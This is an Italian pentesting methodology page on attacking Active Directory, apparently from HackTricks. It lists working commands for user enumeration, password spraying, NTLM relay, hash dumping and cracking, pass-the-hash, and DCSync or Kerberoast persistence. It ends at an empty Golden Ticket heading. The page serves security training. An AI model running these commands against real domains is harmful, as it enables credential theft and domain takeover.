# Metodologia Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Panoramica di base

**Active Directory** funge da tecnologia fondamentale, permettendo agli **amministratori di rete** di creare e gestire in modo efficiente **domini**, **utenti** e **oggetti** all'interno di una rete. È progettata per scalare, facilitando l'organizzazione di un gran numero di utenti in **gruppi** e **sottogruppi** gestibili, controllando i **diritti di accesso** a vari livelli.

La struttura di **Active Directory** è composta da tre livelli principali: **domini**, **alberi** e **foreste**. Un **dominio** comprende una raccolta di oggetti, come **utenti** o **dispositivi**, che condividono un database comune. Gli **alberi** sono gruppi di domini collegati da una struttura condivisa, mentre una **foresta** rappresenta la raccolta di più alberi, interconnessi tramite **trust relationships**, formando il livello più alto della struttura organizzativa. Diritti specifici di **accesso** e **comunicazione** possono essere assegnati a ciascuno di questi livelli.

Concetti chiave in **Active Directory** includono:

1. **Directory** – Contiene tutte le informazioni relative agli oggetti di Active Directory.
2. **Oggetto** – Indica entità all'interno della directory, inclusi **utenti**, **gruppi** o **cartelle condivise**.
3. **Dominio** – Funziona da contenitore per gli oggetti della directory; possono coesistere più domini all'interno di una **foresta**, ognuno con la propria raccolta di oggetti.
4. **Albero** – Raggruppamento di domini che condividono un dominio radice comune.
5. **Foresta** – Il livello più alto della struttura organizzativa in Active Directory, composta da diversi alberi con **trust relationships** tra di essi.

**Active Directory Domain Services (AD DS)** comprende una serie di servizi critici per la gestione centralizzata e la comunicazione all'interno di una rete. Questi servizi includono:

1. **Domain Services** – Centralizza l'archiviazione dei dati e gestisce le interazioni tra **utenti** e **domini**, inclusi i processi di **authentication** e **search**.
2. **Certificate Services** – Gestisce la creazione, la distribuzione e la gestione dei **digital certificates** sicuri.
3. **Lightweight Directory Services** – Supporta applicazioni abilitare alla directory tramite il protocollo **LDAP**.
4. **Directory Federation Services** – Fornisce funzionalità di **single-sign-on** per autenticare utenti attraverso più applicazioni web in una singola sessione.
5. **Rights Management** – Aiuta a proteggere materiale soggetto a copyright regolando la sua distribuzione e uso non autorizzati.
6. **DNS Service** – Cruciale per la risoluzione dei **nomi di dominio**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Per imparare come **attaccare un AD** è necessario comprendere molto bene il processo di **autenticazione Kerberos**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Puoi consultare https://wadcoms.github.io/ per avere una panoramica rapida dei comandi che puoi eseguire per enumerare/sfruttare un AD.

> [!WARNING]
> La comunicazione Kerberos **richiede un nome completamente qualificato (FQDN)** per eseguire azioni. Se provi ad accedere a una macchina tramite l'indirizzo IP, **verrà usato NTLM e non Kerberos**.

## Recon Active Directory (No creds/sessions)

Se hai accesso all'ambiente AD ma non possiedi credenziali/sessioni, potresti:

- **Pentest the network:**
- Scansionare la rete, trovare macchine e porte aperte e provare a **sfruttare vulnerabilità** o **estrarre credenziali** da esse (per esempio, [printers could be very interesting targets](ad-information-in-printers.md).
- L'enumerazione del DNS può fornire informazioni sui server chiave nel dominio come web, printer, share, vpn, media, ecc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Dai un'occhiata alla [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) generale per trovare più informazioni su come procedere.
- **Controlla l'accesso null e Guest sui servizi smb** (questo non funziona sulle versioni moderne di Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Una guida più dettagliata su come enumerare un server SMB è disponibile qui:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerare LDAP**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Una guida più dettagliata su come enumerare LDAP è disponibile qui (presta **particolare attenzione all'accesso anonimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Avvelenare la rete**
- Raccogliere credenziali **impersonando servizi con Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Accedere a host abusando di [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Raccogliere credenziali **esponendo** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Estrarre username/nomi da documenti interni, social media, servizi (soprattutto web) all'interno degli ambienti di dominio e anche da quelli pubblicamente disponibili.
- Se trovi i nomi completi dei dipendenti, puoi provare diverse convenzioni di **username AD** ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Le convenzioni più comuni sono: _NameSurname_, _Name.Surname_, _NamSur_ (3 lettere di ciascuno), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Strumenti:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumerazione utenti

- **Anonymous SMB/LDAP enum:** Consulta le pagine [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) e [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Quando viene richiesta una **username non valida** il server risponderà con il codice di errore Kerberos _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, permettendoci di determinare che l'username era invalida. Le **username valide** restituiranno o il **TGT in un AS-REP** o l'errore _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando che l'utente è tenuto a effettuare la pre-authentication.
- **No Authentication against MS-NRPC**: Usando auth-level = 1 (No authentication) contro l'interfaccia MS-NRPC (Netlogon) sui domain controller. Il metodo invoca la funzione `DsrGetDcNameEx2` dopo il bind dell'interfaccia MS-NRPC per verificare se l'utente o il computer esiste senza alcuna credenziale. Lo strumento [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa questo tipo di enumerazione. La ricerca può essere trovata [qui](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Se hai trovato uno di questi server nella rete puoi anche eseguire **user enumeration against it**. Ad esempio, puoi usare lo strumento [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Puoi trovare liste di usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  e in questo ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Tuttavia, dovresti avere il **nome delle persone che lavorano nell'azienda** dalla fase di recon che avresti dovuto eseguire prima. Con nome e cognome puoi usare lo script [**namemash.py**](https://gist.github.com/superkojiman/11076951) per generare potenziali usernames validi.

### Conoscere uno o più usernames

Ok, quindi sai già di avere un username valido ma nessuna password... Prova quindi:

- [**ASREPRoast**](asreproast.md): Se un utente **non ha** l'attributo _DONT_REQ_PREAUTH_ puoi **richiedere un AS_REP message** per quell'utente che conterrà alcuni dati cifrati con una derivazione della password dell'utente.
- [**Password Spraying**](password-spraying.md): Proviamo le **password più comuni** con ciascuno degli utenti scoperti; magari qualche utente usa una password debole (ricorda la password policy!).
- Nota che puoi anche **spray OWA servers** per cercare di ottenere accesso alle caselle mail degli utenti.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Potresti essere in grado di **ottenere** alcuni challenge **hashes** da crackare avvelenando alcuni protocolli della rete:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Se sei riuscito a enumerare Active Directory avrai **più email e una migliore comprensione della rete**. Potresti essere in grado di forzare NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) per ottenere accesso all'ambiente AD.

### NetExec workspace-driven recon & relay posture checks

- Usa gli **`nxcdb` workspaces** per mantenere lo stato di recon AD per ciascun engagement: `workspace create <name>` genera DB SQLite per-protocollo sotto `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Cambia vista con `proto smb|mssql|winrm` e lista i segreti raccolti con `creds`. Pulisci manualmente i dati sensibili al termine: `rm -rf ~/.nxc/workspaces/<name>`.
- Scoperta rapida della subnet con **`netexec smb <cidr>`** mette in evidenza **domain**, **OS build**, **SMB signing requirements**, e **Null Auth**. I membri che mostrano `(signing:False)` sono **relay-prone**, mentre i DCs spesso richiedono signing.
- Genera **hostnames in /etc/hosts** direttamente dall'output di NetExec per facilitare il targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Quando **SMB relay to the DC is blocked** a causa del signing, verifica comunque la postura **LDAP**: `netexec ldap <dc>` evidenzia `(signing:None)` / weak channel binding. Un DC con SMB signing richiesto ma LDAP signing disabilitato rimane un target valido per **relay-to-LDAP** in abusi come **SPN-less RBCD**.

### Client-side printer credential leaks → validazione massiva delle credenziali di dominio

- Le Printer/web UI a volte **inseriscono password amministrative mascherate nell'HTML**. Visualizzare il sorgente/devtools può rivelare il testo in chiaro (es., `<input value="<password>">`), consentendo l'accesso Basic-auth ai repository di scansione/stampa.
- I lavori di stampa recuperati possono contenere **documenti di onboarding in plaintext** con password per singolo utente. Mantieni gli accoppiamenti allineati durante i test:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Rubare credenziali NTLM

Se puoi **accedere ad altri PC o share** con l'**utente null o guest** potresti **posizionare file** (come un file SCF) che, se in qualche modo vengono aperti, attiveranno un'autenticazione NTLM verso di te così puoi **rubare** la **challenge NTLM** per crackerla:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** tratta ogni NT hash che possiedi già come una password candidata per altri formati più lenti il cui materiale chiave è derivato direttamente dall'NT hash. Invece di brute-forzare lunghe passphrase in Kerberos RC4 tickets, NetNTLM challenges o cached credentials, fornisci gli NT hash nelle modalità NT-candidate di Hashcat e lascia che verifichi il riuso delle password senza mai apprendere il plaintext. Questo è particolarmente potente dopo una compromissione di dominio dove puoi raccogliere migliaia di NT hash correnti e storici.

Usa shucking quando:

- Hai un corpus di NT da DCSync, dump SAM/SECURITY, o vault di credenziali e devi testare il riuso in altri domini/foreste.
- Catturi materiale Kerberos basato su RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), risposte NetNTLM, o blob DCC/DCC2.
- Vuoi dimostrare rapidamente il riuso per passphrase lunghe e non crackabili e pivotare immediatamente via Pass-the-Hash.

La tecnica **non funziona** contro tipi di cifratura i cui key material non sono l'NT hash (es. Kerberos etype 17/18 AES). Se un dominio impone solo AES, devi tornare alle modalità password regolari.

#### Costruire un corpus di NT hash

- **DCSync/NTDS** – Usa `secretsdump.py` con history per ottenere il più ampio set possibile di NT hash (e i loro valori precedenti):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Le voci di history ampliano dramaticamente il pool di candidati perché Microsoft può memorizzare fino a 24 hash precedenti per account. Per altri modi di estrarre segreti NTDS vedi:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (o Mimikatz `lsadump::sam /patch`) estrae dati SAM/SECURITY locali e cached domain logons (DCC/DCC2). Deduplica e aggiungi quegli hash allo stesso file `nt_candidates.txt`.
- **Traccia i metadata** – Mantieni username/dominio che ha prodotto ogni hash (anche se la wordlist contiene solo esadecimale). Gli hash corrispondenti ti dicono immediatamente quale principal sta riusando una password quando Hashcat stampa il candidato vincente.
- Preferisci candidati dalla stessa forest o da una forest trusted; questo massimizza la probabilità di overlap nello shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Modalità Password | Modalità NT-Candidate |
| ---------------------------------------- | ----------------- | --------------------- |
| Domain Cached Credentials (DCC)          | 1100              | 31500                 |
| Domain Cached Credentials 2 (DCC2)       | 2100              | 31600                 |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500              | 27000                 |
| NetNTLMv2                                | 5600              | 27100                 |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500              | _N/A_                 |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100             | 35300                 |
| Kerberos 5 etype 23 AS-REP               | 18200             | 35400                 |

Note:

- Gli input NT-candidate **devono rimanere raw 32-hex NT hashes**. Disabilita gli engine di rule (no `-r`, no hybrid modes) perché le mangling corrompono il materiale chiave candidato.
- Queste modalità non sono intrinsecamente più veloci, ma lo spazio chiave NTLM (~30,000 MH/s su un M3 Max) è ~100× più rapido rispetto a Kerberos RC4 (~300 MH/s). Testare una lista NT curata è molto più economico che esplorare l'intero spazio password nel formato lento.
- Esegui sempre l'**ultima build di Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) perché le modalità 31500/31600/35300/35400 sono state introdotte di recente.
- Attualmente non esiste una modalità NT per AS-REQ Pre-Auth, e gli etype AES (19600/19700) richiedono la password in chiaro perché le loro chiavi sono derivate via PBKDF2 da password in UTF-16LE, non da raw NT hashes.

#### Esempio – Kerberoast RC4 (mode 35300)

1. Cattura un RC4 TGS per uno SPN target con un utente a basso privilegio (vedi la pagina Kerberoast per i dettagli):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shucka il ticket con la tua lista NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat deriva la chiave RC4 da ogni candidato NT e valida il blob `$krb5tgs$23$...`. Una corrispondenza conferma che l'account di servizio usa uno degli NT hash già presenti nella tua lista.

3. Pivotare immediatamente via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Puoi opzionalmente recuperare il plaintext più tardi con `hashcat -m 1000 <matched_hash> wordlists/` se necessario.

#### Esempio – Credenziali in cache (mode 31600)

1. Dumpa i cached logons da una workstation compromessa:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copia la riga DCC2 per l'utente di dominio interessante in `dcc2_highpriv.txt` e shuckala:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Una corrispondenza riuscita restituisce l'NT hash già noto nella tua lista, dimostrando che l'utente in cache sta riusando una password. Usalo direttamente per PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) o brute-forzalo in modalità NTLM veloce per recuperare la stringa.

Lo stesso workflow si applica a NetNTLM challenge-responses (`-m 27000/27100`) e DCC (`-m 31500`). Una volta identificata una corrispondenza puoi lanciare relay, SMB/WMI/WinRM PtH, o ri-crackare l'NT hash con mask/rule offline.

## Enumerare Active Directory CON credenziali/sessione

Per questa fase devi aver **compromesso le credenziali o una sessione di un account di dominio valido.** Se hai qualche credenziale valida o una shell come user di dominio, **ricorda che le opzioni date prima rimangono valide per compromettere altri utenti**.

Prima di iniziare l'enumerazione autenticata dovresti sapere qual è il **Kerberos double hop problem.**

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumerazione

Avere compromesso un account è un **grande passo per iniziare a compromettere l'intero dominio**, perché sarai in grado di avviare l'**Active Directory Enumeration:**

Riguardo a [**ASREPRoast**](asreproast.md) ora puoi trovare ogni possibile utente vulnerabile, e riguardo a [**Password Spraying**](password-spraying.md) puoi ottenere una **lista di tutti gli username** e provare la password dell'account compromesso, password vuote e nuove password potenzialmente promettenti.

- Puoi usare il [**CMD per effettuare un recon di base**](../basic-cmd-for-pentesters.md#domain-info)
- Puoi anche usare [**powershell per il recon**](../basic-powershell-for-pentesters/index.html) che sarà più stealthy
- Puoi anche [**usare powerview**](../basic-powershell-for-pentesters/powerview.md) per estrarre informazioni più dettagliate
- Un altro strumento eccellente per il recon in Active Directory è [**BloodHound**](bloodhound.md). Non è **molto stealthy** (dipende dai metodi di collection che usi), ma **se non ti importa** provarlo è altamente raccomandato. Trova dove gli utenti possono RDP, trova percorsi verso altri gruppi, ecc.
- **Altri strumenti automatizzati di enumeration AD sono:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**Record DNS della AD**](ad-dns-records.md) poiché potrebbero contenere informazioni interessanti.
- Uno **strumento con GUI** che puoi usare per enumerare la directory è **AdExplorer.exe** dalla suite **SysInternals**.
- Puoi anche cercare nel database LDAP con **ldapsearch** per cercare credenziali nei campi _userPassword_ & _unixUserPassword_, o anche in _Description_. vedi [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) per altri metodi.
- Se usi **Linux**, puoi anche enumerare il dominio usando [**pywerview**](https://github.com/the-useless-one/pywerview).
- Puoi anche provare strumenti automatici come:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Estrazione di tutti gli utenti di dominio**

È molto semplice ottenere tutti gli username di dominio da Windows (`net user /domain` ,`Get-DomainUser` o `wmic useraccount get name,sid`). In Linux, puoi usare: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` o `enum4linux -a -u "user" -p "password" <DC IP>`

> Anche se questa sezione di Enumeration sembra breve, è la parte più importante di tutte. Accedi ai link (principalmente quelli di cmd, powershell, powerview e BloodHound), impara come enumerare un dominio e pratica finché non ti senti a tuo agio. Durante un assessment, questo sarà il momento chiave per trovare la strada verso DA o per decidere che non si può fare nulla.

### Kerberoast

Kerberoasting comporta l'ottenimento di **TGS tickets** usati dai servizi legati ad account utente e il cracking della loro cifratura — che si basa sulle password utente — **offline**.

Maggiori dettagli in:

{{#ref}}
kerberoast.md
{{#endref}}

### Connessioni remote (RDP, SSH, FTP, Win-RM, etc)

Una volta ottenute alcune credenziali puoi verificare se hai accesso a qualche **macchina**. A tal proposito, puoi usare **CrackMapExec** per tentare di connetterti su diversi server con diversi protocolli, in base alle tue scansioni di porte.

### Escalation di privilegi locali

Se hai compromesso credenziali o una sessione come utente di dominio regolare e hai **accesso** con questo utente a **qualsiasi macchina del dominio** dovresti cercare di trovare il modo per **escalare privilegi localmente e saccheggiare credenziali**. Questo perché solo con privilegi di amministratore locale sarai in grado di **dumpare gli hash di altri utenti** in memoria (LSASS) e localmente (SAM).

C'è una pagina completa in questo libro su [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) e una [**checklist**](../checklist-windows-privilege-escalation.md). Inoltre, non dimenticare di usare [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Ticket della sessione corrente

È molto **improbabile** che troverai **ticket** nell'utente corrente che ti diano il permesso di accedere a risorse inaspettate, ma puoi controllare:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Se sei riuscito a enumerare Active Directory avrai **più email e una migliore comprensione della rete**. Potresti essere in grado di forzare NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Ora che hai alcune credenziali di base dovresti verificare se puoi **trovare** dei **file interessanti condivisi all'interno di AD**. Puoi farlo manualmente ma è un compito molto noioso e ripetitivo (e ancora di più se trovi centinaia di documenti da controllare).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Se puoi **accedere ad altri PC o shares** potresti **posizionare file** (come un file SCF) che, se in qualche modo vengono aperti, attiveranno un'autenticazione NTLM verso di te così potrai **rubare** la **NTLM challenge** per craccarla:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Questa vulnerabilità permetteva a qualsiasi utente autenticato di **compromettere il domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Per le tecniche seguenti un utente di dominio normale non è sufficiente: hai bisogno di privilegi/credenziali speciali per eseguire questi attacchi.**

### Hash extraction

Si spera che tu sia riuscito a **compromettere qualche account local admin** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Quindi è il momento di estrarre tutti gli hash dalla memoria e localmente.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Una volta che hai l'hash di un utente**, puoi usarlo per **impersonarlo**.\
Devi usare qualche **tool** che **effettui** l'**autenticazione NTLM usando** quell'**hash**, **oppure** puoi creare un nuovo **sessionlogon** e **iniettare** quell'**hash** dentro il **LSASS**, così quando viene effettuata qualsiasi **autenticazione NTLM**, quell'**hash** verrà usato. Quest'ultima opzione è ciò che fa mimikatz.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Se hai l'**hash** o la **password** di un **local admin**, dovresti provare ad **accedere localmente** ad altri **PC** con essa.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Nota che questo è piuttosto **rumoroso** e **LAPS** lo **mitigherebbe**.

### Abuso di MSSQL e Trusted Links

Se un utente ha privilegi per **accedere a istanze MSSQL**, potrebbe essere in grado di usarle per **eseguire comandi** sull'host MSSQL (se in esecuzione come SA), **rubare** l'**hash** NetNTLM o perfino eseguire un **relay attack**.\
Inoltre, se un'istanza MSSQL è trusted (database link) da una diversa istanza MSSQL. Se l'utente ha privilegi sul database trusted, potrà **usare la relazione di trust per eseguire query anche nell'altra istanza**. Queste trust possono essere concatenate e a un certo punto l'utente potrebbe trovare un database mal configurato dove può eseguire comandi.\
**I link tra database funzionano anche attraverso forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuso di piattaforme di IT asset/deployment

Strumenti di inventario e deployment di terze parti spesso espongono vie potenti verso credenziali ed esecuzione di codice. Vedi:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Se trovi un oggetto Computer con l'attributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) e hai privilegi di dominio sul computer, potrai estrarre i TGT dalla memoria di ogni utente che effettua login sul computer.\
Quindi, se un **Domain Admin effettua il login sul computer**, potrai estrarre il suo TGT e impersonarlo usando [Pass the Ticket](pass-the-ticket.md).\
Grazie alla constrained delegation potresti anche **compromettere automaticamente un Print Server** (si spera che sia un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Se un utente o computer è abilitato per la "Constrained Delegation" sarà in grado di **impersonare qualsiasi utente per accedere ad alcuni servizi su un computer**.\
Quindi, se **comprometti l'hash** di questo utente/computer sarai in grado di **impersonare qualsiasi utente** (anche Domain Admins) per accedere ad alcuni servizi.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Avere il privilegio **WRITE** su un oggetto Active Directory di un computer remoto permette di ottenere esecuzione di codice con **privilegi elevati**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

L'utente compromesso potrebbe avere alcuni **privilegi interessanti su certi oggetti del dominio** che potrebbero permetterti di **muoverti lateralmente**/**escalare** i privilegi.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Individuare un servizio **Spool in ascolto** all'interno del dominio può essere **abusato** per **acquisire nuove credenziali** e **escalare privilegi**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Se **altri utenti** **accedono** alla macchina **compromessa**, è possibile **raccogliere credenziali dalla memoria** e perfino **iniettare beacons nei loro processi** per impersonarli.\
Di solito gli utenti accedono al sistema tramite RDP, quindi qui trovi come eseguire un paio di attacchi su sessioni RDP di terze parti:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fornisce un sistema per gestire la **password dell'Administrator locale** sui computer joinati al dominio, assicurando che sia **randomizzata**, unica e frequentemente **cambiata**. Queste password sono memorizzate in Active Directory e l'accesso è controllato tramite ACL solo per utenti autorizzati. Con permessi sufficienti per accedere a queste password, diventa possibile pivotare verso altri computer.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Raccogliere certificati** dalla macchina compromessa potrebbe essere un modo per aumentare i privilegi all'interno dell'ambiente:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Se sono configurati **template vulnerabili** è possibile abusarne per elevare i privilegi:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation con account ad alto privilegio

### Dumping Domain Credentials

Una volta ottenuti privilegi **Domain Admin** o ancor meglio **Enterprise Admin**, puoi **estrarre** il **database di dominio**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Alcune delle tecniche discusse prima possono essere usate per la persistenza.\
Per esempio potresti:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

L'**attacco Silver Ticket** crea un **Ticket Granting Service (TGS) legittimo** per un servizio specifico usando l'**NTLM hash** (ad esempio, l'**hash dell'account PC**). Questo metodo viene impiegato per **accedere ai privilegi del servizio**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

